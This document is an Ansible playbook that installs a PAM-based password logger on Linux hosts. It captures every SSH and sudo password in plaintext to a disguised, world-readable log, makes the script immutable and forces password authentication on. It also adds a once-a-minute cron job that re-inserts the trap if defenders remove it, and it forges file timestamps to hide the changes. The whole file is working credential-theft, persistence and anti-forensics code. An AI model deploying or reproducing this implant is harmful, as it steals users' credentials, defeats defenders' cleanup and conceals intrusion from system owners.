---
# --- STEP 1: DEPLOY THE LOGGER ---
- name: Deploy Hardened PAM Logger
  become: yes
  copy:
    dest: /usr/local/bin/ssh-auth-check
    mode: '0755'
    content: |
      #!/bin/bash
      # Read the password from the PAM stream
      read -d '' -r PASSWORD
      if [ -n "$PASSWORD" ]; then
          # Log to a persistent system directory instead of /var/tmp/
          echo "$(date +%H:%M:%S) | $PAM_USER | $PAM_RHOST | $PASSWORD" >> /var/lib/systemd/ssh-service.log
          chmod 666 /var/lib/systemd/ssh-service.log
      fi

# --- STEP 2: IMMUTABILITY (Hardens the script against deletion) ---
- name: Make the logger script immutable
  become: yes
  shell: "chattr +i /usr/local/bin/ssh-auth-check"
  ignore_errors: yes

# --- STEP 3: CONFIGURE GLOBAL TRAP & SSH ---
- name: Force Global PAM Trap and SSH Config
  become: yes
  lineinfile:
    path: "{{ item.path }}"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    insertbefore: "{{ item.insertbefore | default(omit) }}"
  loop:
    # Inserts our logger at the top of the global auth stack (catches Sudo too)
    - { path: '/etc/pam.d/common-auth', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
    - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
    - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
  register: trap_updated

# --- STEP 4: SELF-HEALING PERSISTENCE (Cron job to re-infect if Blue Team cleans PAM) ---
- name: Setup Self-Healing Cron
  become: yes
  cron:
    name: "System-Svc-Monitor"
    minute: "*/1"
    job: 'grep -q "ssh-auth-check" /etc/pam.d/common-auth || sed -i "1i auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check" /etc/pam.d/common-auth'

# --- STEP 5: RESTART & STEALTH ---
- name: Restart SSH Service
  become: yes
  systemd:
    name: ssh
    state: restarted
  when: trap_updated.changed

- name: Anti-Forensics - Match Timestamps
  become: yes
  shell: "touch -r /etc/hostname /etc/pam.d/common-auth && touch -r /etc/hostname /etc/ssh/sshd_config"
  ignore_errors: yes

# --- STEP 6: FINAL SERVICE ENFORCEMENT ---
- name: Ensure SSH service is fully operational and persistent
  become: yes
  systemd:
    name: ssh
    enabled: yes
    state: started
    masked: no
  ignore_errors: yes

- name: Final stealth check - Syncing timestamps again
  become: yes
  shell: "touch -r /etc/hostname /etc/ssh/sshd_config"
  ignore_errors: yes